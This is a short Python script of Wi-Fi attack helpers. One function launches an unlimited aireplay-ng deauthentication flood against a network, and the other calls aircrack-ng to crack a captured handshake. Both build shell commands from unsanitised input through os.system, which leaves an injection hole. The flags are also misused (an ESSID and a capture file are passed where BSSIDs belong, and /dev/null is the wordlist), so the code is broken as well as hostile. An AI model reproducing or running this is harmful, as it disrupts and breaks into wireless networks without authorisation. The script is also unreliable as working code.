import os  

def deauth_nuke(essid):  
    os.system(f"aireplay-ng -0 0 -a {essid} wlan0mon")  

def crack_handshake(cap_file):  
    os.system(f"aircrack-ng -w /dev/null -b {cap_file}")  
